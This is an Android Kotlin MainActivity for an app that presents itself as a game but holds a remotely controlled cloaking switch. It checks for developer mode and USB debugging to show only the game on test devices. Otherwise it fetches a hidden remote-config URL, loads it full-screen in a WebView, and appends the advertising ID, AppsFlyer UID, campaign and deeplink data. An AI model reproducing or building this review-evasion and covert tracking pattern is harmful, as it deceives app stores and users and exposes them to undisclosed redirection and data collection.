package com.hk.stck.nord

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.webkit.WebChromeClient
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.Input
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.hk.stck.nord.bebView.BebViewChromeClient
import com.hk.stck.nord.bebView.BebViewController
import com.hk.stck.nord.databinding.ActivityMainBinding
import com.hk.stck.nord.game.game
import com.hk.stck.nord.game.utils.Completer
import com.hk.stck.nord.util.*
import com.hk.stck.nord.util.manager.DataStoreManager
import com.hk.stck.nord.util.network.haveNetworkConnection
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {

        @SuppressLint("StaticFieldLeak")
        lateinit var binding: ActivityMainBinding

        val bebView by lazy { binding.webView }
        val lottie  by lazy { LottieUtil(binding) }

        val isBebViewVisibleFlow = MutableStateFlow<Boolean?>(null)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (haveNetworkConnection().not()) lottie.showNotNetwork()
        else {
            lottie.showLoader()

            BebViewController(this@MainActivity, bebView).initialize()

            checkDataStore()

            coroutine.launch(Dispatchers.Main) {
                isBebViewVisibleFlow.collect { it?.let { isBebViewVisible ->
                    requestedOrientation = if (isBebViewVisible) {
                        bebView.visibility = View.VISIBLE
                        window.navigationBarColor = ContextCompat.getColor(this@MainActivity, R.color.black)
                        ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    } else {
                        bebView.visibility = View.GONE
                        ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                    }
                } }
            }
        }
    }

    override fun onResume() {
        bebView.onResume()
        super.onResume()
    }

    override fun onPause() {
        bebView.onPause()
        super.onPause()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == BebViewChromeClient.REQUEST_SELECT_FILE) {
            if (BebViewChromeClient.uploadMessage == null) return
            BebViewChromeClient.uploadMessage!!.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, data))
            BebViewChromeClient.uploadMessage = null
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onBackPressed() {
        if (bebView.canGoBack()) bebView.goBack() else game.screen?.keyDown(Input.Keys.BACK)
    }

    // ------------------------------------------------------------------------
    // Logic
    // ------------------------------------------------------------------------

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Good" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = Good | link = $it")
                        BebViewController.bebUrlFlow.value = it
                        isBebViewVisibleFlow.value = true
                        lottie.hideLoader()
                    }
                }
                "Bad"  -> {
                    log("DataStoreManager Key = Bad")
                    isBebViewVisibleFlow.value = false
                }
                else   -> {
                    log("DataStoreManager Key = NONE")
                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) isBebViewVisibleFlow.value = false
                    else try {
                        Firebase.remoteConfig.apply {
                            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
                            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                                if (task.isSuccessful) {
                                    val jsonStr = getString("HalitoFR")
                                    log("succes = $jsonStr")
                                    JSONObject(jsonStr).also { jsonObj ->
                                        coroutine.launch(Dispatchers.IO) {
                                            getFinance(jsonObj.getBoolean("quick"), jsonObj.getString("ask"))
                                        }
                                    }

                                } else {
                                    isBebViewVisibleFlow.value = false
                                    log("fail = ${this.all}")
                                }
                            }
                        }
                    } catch (e: Exception) {
                        isBebViewVisibleFlow.value = false
                    }
                }
            }
        }
    }

    private suspend fun getFinance(quick: Boolean, ask: String) {
        if (quick) {
            withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Good" } }
            withContext(Dispatchers.Main) {
                val completer = Completer(coroutine, 2) {
                    val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
                    val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val fullAsk = ask + "?" +
                            "adurti_did=${advertisingId}&" +
                            "afy_uisd=${appsflyerUID}&" +
                            "com_ing=${AppsflyerUtil.campaignFlow.value}&" +
                            "dooinlk=${FacebookUtil.deeplinkFlow.value}"

                    log("fullAsk = $fullAsk")

                    BebViewController.bebUrlFlow.value = fullAsk
                    isBebViewVisibleFlow.value = true
                    lottie.hideLoader()

                    coroutine.launch(Dispatchers.IO) { DataStoreManager.Link.update { fullAsk } }
                }

                AppsflyerUtil.initialize(this@MainActivity)
                coroutine.launch {
                    AppsflyerUtil.campaignFlow.collect {
                        log("campaignFlow = $it")
                        if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete()
                    }
                }

                FacebookUtil.initialize()
                coroutine.launch {
                    FacebookUtil.deeplinkFlow.collect {
                        log("deeplinkFlow = $it")
                        if (it != FacebookUtil.DEEPLINK_INIT_VALUE) completer.complete()
                    }
                }
            }
        } else {
            withContext(Dispatchers.IO) { DataStoreManager.Key.update { "Bad" } }
            isBebViewVisibleFlow.value = false
        }
    }

    @RequiresApi(Build.VERSION_CODES.JELLY_BEAN)
    fun isDevMode(context: Context): Boolean {
        return when {
            Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN  -> {
                Settings.Secure.getInt(context.contentResolver,
                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
            }
            Build.VERSION.SDK_INT == Build.VERSION_CODES.JELLY_BEAN -> {
                @Suppress("DEPRECATION")
                Settings.Secure.getInt(context.contentResolver,
                    Settings.Secure.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
            }
            else                                                    -> false
        }
    }

    fun isUSB(context: Context): Boolean = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ADB_ENABLED, 0) != 0

}